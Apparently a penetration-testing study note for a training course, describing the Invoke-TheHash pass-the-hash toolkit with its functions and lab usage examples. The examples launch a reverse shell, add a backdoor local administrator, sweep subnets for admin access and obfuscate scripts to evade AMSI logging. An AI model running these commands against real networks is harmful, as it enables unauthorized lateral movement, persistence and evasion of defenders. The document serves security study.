# Invoke-TheHash

**Tags:** `#invokethehash` `#passthehash` `#credentials` `#auth` `#lateralmovement` `#powershell` `#ntlm`

A pure-PowerShell **pass-the-hash** toolkit — run remote commands, enumerate, and access
shares against Windows hosts using only a user's **NTLM hash**, no plaintext password. It's
built on the .NET `TCPClient` (not the Windows SMB client), so it works from any PowerShell
session and needs **no local admin on your side** — but you do need the hash to belong to an
account that is **admin on the target** for the exec functions.

**Source:** https://github.com/Kevin-Robertson/Invoke-TheHash
**Install:** import the module in a PowerShell session (no install / no compile):

```powershell
Import-Module ./Invoke-TheHash.psd1
# or dot-source individual functions:  . .\Invoke-WMIExec.ps1
```

> [!warning] **PowerShell footprint.** No binary is dropped, but the scripts trip **AMSI**
> and **Script Block Logging** (event 4104) on hardened hosts — load in-memory / obfuscate as
> needed. `Invoke-SMBExec` creates a service (like PsExec → SCM event **7045**);
> `Invoke-WMIExec` is quieter (WMI, no service).

> [!important] **Command execution is blind.** WMIExec/SMBExec do **not** return command
> output — pass a **launcher / reverse-shell** as `-Command`, not a query you expect to read.
> Omit `-Command` entirely and the function just **checks whether the hash has access** (WMI
> or SCM) on the target — a fast "where am I local admin?" sweep.

---

## Functions

| Function | Does | Notes |
|---|---|---|
| `Invoke-WMIExec` | Command exec over **WMI/DCOM** | quieter (no service); blind output |
| `Invoke-SMBExec` | Command exec over **SMB** (PsExec-style) | creates a service → SYSTEM; SMB1/2.1, signing-aware |
| `Invoke-SMBClient` | Read/write **SMB shares** with a hash | .NET client — slower than Windows'; for hashes without exec rights |
| `Invoke-SMBEnum` | User / Group / NetSession / Share **enumeration** | over SMB2.1, signing-aware |
| `Invoke-TheHash` | **Dispatcher** — run any of the above across many targets | `-Type SMBExec\|WMIExec\|SMBClient\|SMBEnum` |

`-Hash` accepts either **`LM:NTLM`** or a bare **`NTLM`** (32 hex) — the NT hash alone is enough.

---

## Usage

### Command Execution — WMI (quieter)

```powershell
Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -Verbose

# Real example — fire a base64 PowerShell reverse shell
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <BASE64_revshell>" -Verbose
```

### Command Execution — SMB (PsExec-style, → SYSTEM)

```powershell
Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -Verbose

# Add a local admin (blind — no output comes back)
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

### Enumeration & Share Access

```powershell
# Enumerate users/groups/sessions/shares
Invoke-SMBEnum -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Verbose

# Access a share with a hash (no exec rights needed)
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Source \\server\share -Verbose
```

### Dispatcher — Sweep Many Targets

```powershell
# -Target takes hostnames, IPs, CIDR, or ranges; -TargetExclude drops hosts
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0

# No -Command = access check: "which of these am I local admin on?"
Invoke-TheHash -Type SMBExec -Target 192.168.100.0/24 -Username Administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0
```

---

> [!note] **See also** — get the hash from [[Tools/Auth/mimikatz|mimikatz]]
> (`sekurlsa::logonpasswords`) or [[Tools/Credential Dumping/secretsdump|secretsdump]], then
> pass it here. Cross-platform equivalents: [[Tools/Auth/impacket-psexec|impacket-psexec]]
> (Linux, `-hashes`) and NetExec (`nxc smb -H <hash>`) for scale. Methodology:
> [[Class notes/HTB Academy/CPTS v2 (claude)/Password Attacks|Password Attacks]] (CPTS v2).

---

*Created: 2026-07-13*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
